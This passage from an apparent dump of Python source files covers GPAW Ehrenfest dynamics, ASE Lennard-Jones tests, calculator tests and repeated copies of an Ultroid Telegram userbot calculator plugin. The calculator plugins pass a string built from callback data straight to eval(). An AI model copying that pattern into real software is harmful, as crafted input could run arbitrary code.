}\n    \"\"\"\n    similarity_calc_proto = sim_calc_pb2.RegionSimilarityCalculator()\n    text_format.Merge(similarity_calc_text_proto, similarity_calc_proto)\n    similarity_calc = region_similarity_calculator_builder.build(\n        similarity_calc_proto)\n    self.assertTrue(isinstance(similarity_calc,\n                               region_similarity_calculator.\n                               NegSqDistSimilarity))\n\n\nif __name__ == '__main__':\n  tf.test.main()\n", "277": "from ase.units import Bohr, AUT, _me, _amu\nfrom gpaw import *\nfrom gpaw.tddft import *\nfrom gpaw.tddft.units import attosec_to_autime\nfrom gpaw.mpi import world\n\n###############################################################################\n# EHRENFEST DYNAMICS WITHIN THE PAW METHOD\n# WORKS WITH PAW AS LONG THERE ISN'T TOO\n# TOO MUCH OVERLAP BETWEEN THE SPHERES\n# SUPPORTS ALSO HGH PSEUDOPOTENTIALS\n###############################################################################\n\n# m a(t+dt)   = F[psi(t),x(t)] \n# x(t+dt/2)   = x(t) + v(t) dt/2 + .5 a(t) (dt/2)^2\n# vh(t+dt/2)  = v(t) + .5 a(t) dt/2\n# m a(t+dt/2) = F[psi(t),x(t+dt/2)] \n# v(t+dt/2)   = vh(t+dt/2) + .5 a(t+dt/2) dt/2\n#\n# psi(t+dt)   = U(t,t+dt) psi(t)\n#\n# m a(t+dt/2) = F[psi(t+dt),x(t+dt/2)] \n# x(t+dt)     = x(t+dt/2) + v(t+dt/2) dt/2 + .5 a(t+dt/2) (dt/2)^2\n# vh(t+dt)    = v(t+dt/2) + .5 a(t+dt/2) dt/2\n# m a(t+dt)   = F[psi(t+dt),x(t+dt)] \n# v(t+dt)     = vh(t+dt/2) + .5 a(t+dt/2) dt/2\n\n#TODO: move force corrections from forces.py to this module, as well as\n# the cg method for calculating the inverse of S from overlap.py\n\nclass EhrenfestVelocityVerlet:\n    \n    def __init__(self, calc, mass_scale = 1.0, setups='paw'):\n        \"\"\"Initializes the Ehrenfest MD calculator.\n\n        Parameters\n        ----------\n\n        calc: TDDFT Object\n\n        mass_scale: 1.0\n            Scaling coefficient for atomic masses\n\n        setups: {'paw', 'hgh'}\n            Type of setups to use for the calculation\n\n        Note\n        ------\n\n        Use propagator = 'EFSICN' for when creating the TDDFT object from a PAW ground state\n        calculator and propagator = 'EFSICN_HGH' for HGH pseudopotentials\n\n        \"\"\"\n        #print '--- EhrenfestVelocityVerlet is NOT READY FOR PRODUCTION USE ---'\n        self.calc = calc\n        self.setups = setups\n        self.x  = self.calc.atoms.positions.copy() / Bohr\n        self.xn = self.x.copy()\n        self.v  = self.x.copy()\n        amu_to_aumass = _amu / _me\n        if self.calc.atoms.get_velocities() is not None:\n            self.v = self.calc.atoms.get_velocities() / (Bohr / AUT)\n        else:\n            self.v[:] = 0.0\n            self.calc.atoms.set_velocities(self.v)\n        \n        self.vt = self.v.copy()\n        self.vh = self.v.copy()\n        self.time = 0.0\n        \n        self.M = calc.atoms.get_masses() * amu_to_aumass * mass_scale\n\n        self.a  = self.v.copy()\n        self.ah = self.a.copy()\n        self.an = self.a.copy()\n        self.F  = self.a.copy()\n\n        self.calc.get_td_energy()\n        self.calc.forces.reset()\n        self.F = self.calc.forces.calculate(self.calc.wfs,\n                                            self.calc.td_density.get_density(),\n                                            self.calc.td_hamiltonian.hamiltonian)\n\n        for i in range(len(self.F)):\n            self.a[i] = self.F[i] / self.M[i]\n\n\n    def propagate(self, dt):\n        \"\"\"Performs one Ehrenfest MD propagation step\n\n        Parameters\n        ---------\n\n        dt: scalar\n            Time step (in attoseconds) used for the Ehrenfest MD step\n\n        \"\"\"\n        self.x  = self.calc.atoms.positions.copy() / Bohr\n        self.v  = self.calc.atoms.get_velocities() / (Bohr / AUT)\n\n        dt = dt * attosec_to_autime\n\n        # m a(t+dt)   = F[psi(t),x(t)] \n        self.calc.atoms.positions = self.x * Bohr\n        self.calc.set_positions(self.calc.atoms)\n        self.calc.get_td_energy()\n        self.calc.forces.reset()\n        self.F = self.calc.forces.calculate(self.calc.wfs,\n                                            self.calc.td_density.get_density(),\n                                            self.calc.td_hamiltonian.hamiltonian)\n\n        for i in range(len(self.F)):\n            self.a[i] = self.F[i] / self.M[i]\n\n        # x(t+dt/2)   = x(t) + v(t) dt/2 + .5 a(t) (dt/2)^2\n        # vh(t+dt/2)  = v(t) + .5 a(t) dt/2\n        self.xh  = self.x + self.v * dt/2 + .5 * self.a * dt/2*dt/2\n        self.vhh = self.v + .5 * self.a * dt/2\n\n        # m a(t+dt/2) = F[psi(t),x(t+dt/2)a] \n        self.calc.atoms.positions = self.xh * Bohr\n        self.calc.set_positions(self.calc.atoms)\n        self.calc.get_td_energy()\n        self.calc.forces.reset()\n        self.F = self.calc.forces.calculate(self.calc.wfs,\n                                            self.calc.td_density.get_density(),\n                                            self.calc.td_hamiltonian.hamiltonian)\n\n        for i in range(len(self.F)):\n            self.ah[i] = self.F[i] / self.M[i]\n\n        # v(t+dt/2)   = vh(t+dt/2) + .5 a(t+dt/2) dt/2\n        self.vh = self.vhh + .5 * self.ah * dt/2\n\n\n        # Propagate wf\n        # psi(t+dt)   = U(t,t+dt) psi(t)\n        if(self.setups == 'paw'):\n            niters = self.calc.propagator.propagate(self.time, dt, self.vh)\n        else:\n            niters = self.calc.propagator.propagate(self.time, dt)\n        #print 'Propagation took = ', niters\n\n        # m a(t+dt/2) = F[psi(t+dt),x(t+dt/2)] \n        self.calc.atoms.positions = self.xh * Bohr\n        self.calc.set_positions(self.calc.atoms)\n        self.calc.get_td_energy()\n        self.calc.forces.reset()\n        self.F = self.calc.forces.calculate(self.calc.wfs,\n                                            self.calc.td_density.get_density(),\n                                            self.calc.td_hamiltonian.hamiltonian)\n\n        for i in range(len(self.F)):\n            self.ah[i] = self.F[i] / self.M[i]\n\n        # x(t+dt)     = x(t+dt/2) + v(t+dt/2) dt/2 + .5 a(t+dt/2) (dt/2)^2\n        # vh(t+dt)    = v(t+dt/2) + .5 a(t+dt/2) dt/2\n        self.xn  = self.xh + self.vh * dt/2 + .5 * self.ah * dt/2*dt/2\n        self.vhh = self.vh + .5 * self.ah * dt/2\n\n        # m a(t+dt)   = F[psi(t+dt),x(t+dt)] \n        self.calc.atoms.positions = self.xn * Bohr\n        self.calc.set_positions(self.calc.atoms)\n        self.calc.get_td_energy()\n        self.calc.forces.reset()\n        self.F = self.calc.forces.calculate(self.calc.wfs,\n                                            self.calc.td_density.get_density(),\n                                            self.calc.td_hamiltonian.hamiltonian)\n\n        for i in range(len(self.F)):\n            self.an[i] = self.F[i] / self.M[i]\n\n        # v(t+dt)     = vh(t+dt/2) + .5 a(t+dt/2) dt/2\n        self.vn = self.vhh + .5 * self.an * dt/2\n\n        \n        #print '--- X ---'\n        #print self.x\n        #print self.xn\n        #print self.xn - self.x\n        #print '-- V ---'\n        #print self.v\n        #print self.vn\n        #print self.vn - self.v\n        #print '--- A ---'\n        #print self.a\n        #print self.an\n        #print self.an - self.a\n        #print '---'\n\n        # update\n        self.x[:] = self.xn\n        self.v[:] = self.vn\n        self.a[:] = self.an\n\n        # update atoms\n        self.calc.atoms.set_positions(self.x * Bohr)\n        self.calc.atoms.set_velocities(self.v * Bohr / AUT)\n\n    def get_energy(self):\n        \"\"\"Updates kinetic, electronic and total energies\"\"\"\n        self.Ekin = 0.0\n        for i in range(len(self.v)):\n            self.Ekin += (\n                .5 * self.M[i] * self.v[i][0]**2\n                +.5 * self.M[i] * self.v[i][1]**2\n                +.5 * self.M[i] * self.v[i][2]**2\n                )\n        self.Epot = self.calc.get_td_energy()\n        self.Etot = self.Ekin + self.Epot\n\n        #print 'Ecur = ', [self.Etot, self.Ekin, self.Epot]\n        \n        return self.Etot\n        \n    def get_velocities_in_au(self):\n        return self.v\n\n    def set_velocities_in_au(self, v):\n        self.v[:] = v\n        self.calc.atoms.set_velocities(v * Bohr / AUT)\n", "278": "import numpy as np\nimport pytest\n\nfrom ase import Atoms\nfrom ase.build import bulk\nfrom ase.calculators.lj import LennardJones\n\n\n# test non-bulk properties\nreference_potential_energy = pytest.approx(-1.0)\n\n\ndef systems_minimum():\n    \"\"\"two atoms at potential minimum\"\"\"\n\n    atoms = Atoms('H2', positions=[[0, 0, 0], [0, 0, 2 ** (1.0 / 6.0)]])\n    calc = LennardJones(rc=1.0e5)\n    atoms.calc = calc\n    yield atoms\n\n    calc = LennardJones(rc=1.0e5, smooth=True)\n    atoms.calc = calc\n    yield atoms\n\n\ndef test_minimum_energy():\n    # testing at the minimum to see if anything is on fire\n    # See https://en.wikipedia.org/wiki/Lennard-Jones_potential\n    # Minimum is at r=2^(1/6)*sigma, and it's -1.\n\n    for atoms in systems_minimum():\n        assert atoms.get_potential_energy() == reference_potential_energy\n        assert atoms.get_potential_energies().sum() == reference_potential_energy\n\n\ndef test_minimum_forces():\n    # forces should be zero\n    for atoms in systems_minimum():\n        np.testing.assert_allclose(atoms.get_forces(), 0, atol=1e-14)\n\n\ndef test_system_changes():\n    # https://gitlab.com/ase/ase/-/merge_requests/1817\n\n    for atoms in systems_minimum():\n        atoms.calc.calculate(atoms, system_changes=['positions'])\n        assert atoms.get_potential_energy() == reference_potential_energy\n\n\ndef test_finite_difference():\n    # ensure that we got the modified forces right\n    h = 1e-10\n    r = 8.0\n    calc = LennardJones(smooth=True, ro=6, rc=10, sigma=3)\n    atoms = Atoms('H2', positions=[[0, 0, 0], [r, 0, 0]])\n    atoms2 = Atoms('H2', positions=[[0, 0, 0], [r + h, 0, 0]])\n    atoms.calc = calc\n    atoms2.calc = calc\n\n    fd_force = (atoms2.get_potential_energy() - atoms.get_potential_energy()) / h\n    force = atoms.get_forces()[0, 0]\n\n    np.testing.assert_allclose(fd_force, force)\n\n\n# test bulk properties\nstretch = 1.5\nreference_force = pytest.approx(1.57190846e-05)\nreference_pressure = pytest.approx(1.473229212e-05)\n\n\ndef systems_bulk():\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    calc = LennardJones(rc=10)\n    atoms.calc = calc\n\n    yield atoms\n\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    # somewhat hand-picked parameters, but ok for comparison\n    calc = LennardJones(rc=12, ro=10, smooth=True)\n    atoms.calc = calc\n\n    yield atoms\n\n\ndef test_bulk_energies():\n    # check energies\n\n    for atoms in systems_bulk():\n        assert np.allclose(\n            atoms.get_potential_energy(), atoms.get_potential_energies().sum()\n        )\n        # energies should be equal in this high-symmetry structure\n        assert atoms.get_potential_energies().std() == pytest.approx(0.0)\n\n\ndef test_bulk_forces():\n    for atoms in systems_bulk():\n        # displace atom for 0.03 \\AA\n        atoms.positions[0, 0] += 0.03\n\n        # check forces sum to zero\n        assert np.allclose(atoms.get_forces().sum(axis=0), 0)\n\n        # check reference force\n        assert atoms.get_forces()[0, 0] == reference_force\n\n\ndef test_bulk_stress():\n    # check stress computation for sanity and reference\n    # reference value computed for \"non-smooth\" LJ, so\n    # we only test that\n    atoms = bulk(\"Ar\", cubic=True)\n    atoms.set_cell(atoms.cell * stretch, scale_atoms=True)\n\n    calc = LennardJones(rc=10)\n    atoms.calc = calc\n\n    stress = atoms.get_stress()\n    stresses = atoms.get_stresses()\n\n    assert np.allclose(stress, stresses.sum(axis=0))\n\n    # check reference pressure\n    pressure = sum(stress[:3]) / 3\n\n    assert pressure == reference_pressure\n", "279": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "280": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "281": "# Ultroid - UserBot\n# Copyright (C) 2021-2022 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import Button, asst, callback, get_string, in_pattern, udB, ultroid_cmd\n\nCALC = {}\n\nm = [\n    \"AC\",\n    \"C\",\n    \"\u232b\",\n    \"%\",\n    \"7\",\n    \"8\",\n    \"9\",\n    \"+\",\n    \"4\",\n    \"5\",\n    \"6\",\n    \"-\",\n    \"1\",\n    \"2\",\n    \"3\",\n    \"x\",\n    \"00\",\n    \"0\",\n    \".\",\n    \"\u00f7\",\n]\ntultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\nlst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\nlst.append([Button.inline(\"=\", data=\"calc=\")])\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.del_key(\"calc\")\n    if e.client._bot:\n        return await e.reply(get_string(\"calc_1\"), buttons=lst)\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\", owner=True)\nasync def _(e):\n    calc = e.builder.article(\"Calc\", text=get_string(\"calc_1\"), buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"), owner=True)\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    user = e.query.user_id\n    get = None\n    if x == \"AC\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.edit(\n            get_string(\"calc_1\"),\n            buttons=[Button.inline(get_string(\"calc_2\"), data=\"recalc\")],\n        )\n    elif x == \"C\":\n        if CALC.get(user):\n            CALC.pop(user)\n        await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get[:-1]})\n            await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/100\"})\n            await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"/\"})\n            await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + \"*\"})\n            await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = eval(get)\n            try:\n                num = float(out)\n                await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                CALC.pop(user)\n                await e.answer(get_string(\"sf_8\"), cache_time=0, alert=True)\n        await e.answer(\"None\")\n    else:\n        if CALC.get(user):\n            get = CALC[user]\n        if get:\n            CALC.update({user: get + x})\n            return await e.answer(str(get + x))\n        CALC.update({user: x})\n        await e.answer(str(x))\n\n\n@callback(\"recalc\", owner=True)\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(get_string(\"calc_1\"), buttons=lst)\n", "282": "# Ultroid - UserBot\n# Copyright (C) 2021 TeamUltroid\n#\n# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >\n# PLease read the GNU Affero General Public License in\n# .\n\"\"\"\n\u2718 Commands Available -\n\n\u2022`{i}calc` - Inline Calculator\n\n\"\"\"\nimport re\n\nfrom . import *\n\n\n@ultroid_cmd(pattern=\"calc\")\nasync def icalc(e):\n    udB.delete(\"calc\")\n    results = await e.client.inline_query(asst.me.username, \"calc\")\n    await results[0].click(e.chat_id, silent=True, hide_via=True)\n    await e.delete()\n\n\n@in_pattern(\"calc\")\n@in_owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    calc = e.builder.article(\"Calc\", text=\"\u2022 Ultroid Inline Calculator \u2022\", buttons=lst)\n    await e.answer([calc])\n\n\n@callback(re.compile(\"calc(.*)\"))\n@owner\nasync def _(e):\n    x = (e.data_match.group(1)).decode()\n    if x == \"AC\":\n        udB.delete(\"calc\")\n        return await e.edit(\n            \"\u2022 Ultroid Inline Calculator \u2022\",\n            buttons=[Button.inline(\"Open Calculator Again\", data=\"recalc\")],\n        )\n    elif x == \"C\":\n        udB.delete(\"calc\")\n        return await e.answer(\"cleared\")\n    elif x == \"\u232b\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get[:-1])\n            return await e.answer(str(get[:-1]))\n    elif x == \"%\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/100\")\n            return await e.answer(str(get + \"/100\"))\n    elif x == \"\u00f7\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"/\")\n            return await e.answer(str(get + \"/\"))\n    elif x == \"x\":\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + \"*\")\n            return await e.answer(str(get + \"*\"))\n    elif x == \"=\":\n        get = udB.get(\"calc\")\n        if get:\n            if get.endswith((\"*\", \".\", \"/\", \"-\", \"+\")):\n                get = get[:-1]\n            out = await calcc(get, e)\n            try:\n                num = float(out)\n                return await e.answer(f\"Answer : {num}\", cache_time=0, alert=True)\n            except BaseException:\n                udB.delete(\"calc\")\n                return await e.answer(\"Error\", cache_time=0, alert=True)\n        return await e.answer(\"None\")\n    else:\n        get = udB.get(\"calc\")\n        if get:\n            udB.set(\"calc\", get + x)\n            return await e.answer(str(get + x))\n        udB.set(\"calc\", x)\n        return await e.answer(str(x))\n\n\n@callback(\"recalc\")\n@owner\nasync def _(e):\n    m = [\n        \"AC\",\n        \"C\",\n        \"\u232b\",\n        \"%\",\n        \"7\",\n        \"8\",\n        \"9\",\n        \"+\",\n        \"4\",\n        \"5\",\n        \"6\",\n        \"-\",\n        \"1\",\n        \"2\",\n        \"3\",\n        \"x\",\n        \"00\",\n        \"0\",\n        \".\",\n        \"\u00f7\",\n    ]\n    tultd = [Button.inline(f\"{x}\", data=f\"calc{x}\") for x in m]\n    lst = list(zip(tultd[::4], tultd[1::4], tultd[2::4], tultd[3::4]))\n    lst.append([Button.inline(\"=\", data=\"calc=\")])\n    await e.edit(\"Noice Inline Calculator\", buttons=lst)\n", "283": "import pytest\nimport allure\n\n\n@allure.feature(\"\u8ba1\u7b97\u5668\")\nclass TestCal:\n\n    # def setup_class(self):\n    #     print(\"setup\")\n    #     self.calc = Calculator()\n    #\n    # def teardown_class(self):\n    #     print(\"teardown\")\n    @allure.story(\"\u76f8\u52a0-\u6574\u6570\")\n    @pytest.mark.run(order=1)\n    def test_add_int(self, calc_class, get_add_calc):\n        assert get_add_calc[2] == calc_class.add(get_add_calc[0], get_add_calc[1])\n\n    @allure.story(\"\u76f8\u52a0-\u6d6e\u70b9\u6570\")\n    @pytest.mark.run(order=2)\n    def test_add_float(self, calc_class, get_add_calc1):\n        assert get_add_calc1[2] == round(calc_class.add(get_add_calc1[0], get_add_calc1[1]), 2)\n\n    @allure.story(\"\u76f8\u51cf-\u6574\u6570\")\n    @pytest.mark.run(order=6)\n    def test_less_int(self, calc_class, get_less_calc):\n        assert get_less_calc[2] == calc_class.less(get_less_calc[0], get_less_calc[1])\n\n    @allure.story(\"\u76f8\u51cf-\u6d6e\u70b9\u6570\")\n    @pytest.mark.run(order=8)\n    def test_less_float(self, calc_class, get_less_calc1):\n        assert get_less_calc1[2] == calc_class.less(get_less_calc1[0], get_less_calc1[1])\n\n    @allure.story(\"\u76f8\u9664-\u6574\u6570\")\n    @pytest.mark.run(order=7)\n    def test_div_int(self, calc_class, get_div_calc):\n        assert get_div_calc[2] == (calc_class.div(get_div_calc[0], get_div_calc[1]))\n\n    @allure.story(\"\u76f8\u9664-\u6d6e\u70b9\u6570\")\n    @pytest.mark.run(order=5)\n    def test_div_float(self, calc_class, get_div_calc1):\n        assert get_div_calc1[2] == calc_class.div(get_div_calc1[0], get_div_calc1[1])\n\n    @allure.story(\"\u76f8\u9664-\u9664\u6570\u4e3a0\")\n    @pytest.mark.run(order=4)\n    def test_div_zero(self, calc_class, get_div_calc2):\n        assert get_div_calc2[2] == calc_class.div(get_div_calc2[0], get_div_calc2[1])\n\n    @allure.story(\"\u76f8\u4e58-\u6574\u6570\")\n    @pytest.mark.run(order=9)\n    def test_mul_int(self, calc_class, get_mul_calc):\n        assert get_mul_calc[2] == calc_class.mul(get_mul_calc[0], get_mul_calc[1])\n\n    @allure.story(\"\u76f8\u4e58-\u6d6e\u70b9\u6570\")\n    @pytest.mark.run(order=3)\n    def test_mul_float(self, calc_class, get_mul_calc1):\n        assert get_mul_calc1[1] == round(calc_class.mul(get_mul_calc1[0], get_mul_calc1[1]), 2)\n", "284": "import numpy as np\n\ndef calculate(list):\n\n  if len(list) != 9:\n    raise ValueError(\"List must contain nine numbers.\")\n\n  #calc_array = np.array(list)\n  calc_matrix = np.array(list).reshape(3,3)\n\n  #print(calc_matrix.mean(axis=0))    does the same...\n  #print(np.mean(calc_matrix, axis=0))  ...as this\n\n  #calculations = {\n   # \"mean\": [calc_matrix.mean(axis=0).tolist(), calc_matrix.mean(axis=1).tolist(), np.mean(calc_matrix).tolist()],\n    #\"variance\": [calc_matrix.var(axis=0).tolist(), calc_matrix.var(axis=1).tolist(), np.var(calc_matrix).tolist()],\n   # \"standard deviation\": [calc_matrix.std(axis=0).tolist(), 